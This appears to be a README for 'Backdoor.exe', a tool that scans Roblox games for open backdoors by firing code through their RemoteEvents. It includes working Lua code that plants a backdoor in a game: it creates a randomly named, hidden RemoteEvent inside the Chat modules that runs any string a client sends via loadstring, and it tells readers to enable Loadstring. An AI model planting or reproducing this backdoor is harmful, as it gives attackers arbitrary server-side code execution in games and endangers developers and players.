# Backdoor.exe
The best backdoor scanner there is. Our [Discord Server](https://discord.com/invite/6HndYgC).

## Credits
* iK4oS
* Angus
* Bubba
* eeee
* Redcarred2

## Information
Backdoor.exe is script that scans for open backdoors in games in [Roblox](https://roblox.com/ "Roblox"). It does this by itterating through every Remote Event and firing a script of of them that creates an object. The scripts checks if the object is created, sees what Remote Event caused that to be created and stores it.

### Opening a backdoor
Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
Make sure to enable `Loadstring` in `ServerScriptServices`.
```lua
local Remote = Instance.new("RemoteEvent", game.Chat:WaitForChild("ClientChatModules").MessageCreatorModules)
Remote.Name = tostring(math.random(100000000,1000000000))
Remote.OnServerEvent:connect(function(player, execute)
	loadstring(execute)()
end)
```
